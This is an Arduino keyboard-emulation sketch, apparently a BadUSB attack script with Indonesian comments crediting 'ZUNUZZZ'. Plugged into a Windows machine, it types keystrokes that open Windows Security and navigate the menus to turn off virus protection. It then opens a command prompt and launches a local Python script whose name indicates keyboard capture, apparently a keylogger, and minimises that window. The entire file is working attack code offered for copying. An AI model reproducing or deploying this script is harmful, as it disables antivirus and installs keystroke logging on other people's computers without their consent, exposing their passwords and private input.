#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}
//modifikasi atau copas kontak ZUNUZZZ 
void setup()
{
  Keyboard.begin();

  delay(500);

  delay(2500);
  
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(1000);
  
  Keyboard.print("notepad");
  delay(500);
  typeKey(KEY_RETURN);

  delay(500);
//modifikasi atau copas kontak ZUNUZZZ 
  Keyboard.print("ZUNUZZZ...");
  delay(1000);
  typeKey(KEY_RETURN);
  
  delay(2000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("Virus & threat protection");
  delay(1000);
  typeKey(KEY_RETURN);

  delay(2000);

  for (int i = 0; i < 6; i++) {
    typeKey(KEY_DOWN_ARROW);
    delay(200); 
  }

  typeKey(KEY_RETURN);
  delay(500);

  typeKey(0x20);
  delay(500);

  typeKey(KEY_LEFT_ARROW);
  delay(500);
//modifikasi atau copas kontak ZUNUZZZ 
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();
  delay(500);

  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);

  Keyboard.print("cmd");
  delay(500);
  typeKey(KEY_RETURN);

  delay(1000);

  Keyboard.print("D:");
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("cd teskod\\koding\\tangkapkeyboard");
  typeKey(KEY_RETURN);
  delay(500);

  Keyboard.print("python objtangkapkeyboard.py");
  typeKey(KEY_RETURN);
//modifikasi atau copas kontak ZUNUZZZ 
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_DOWN_ARROW);
  Keyboard.releaseAll();
  delay(500);

  Keyboard.end();
}

void loop() {}
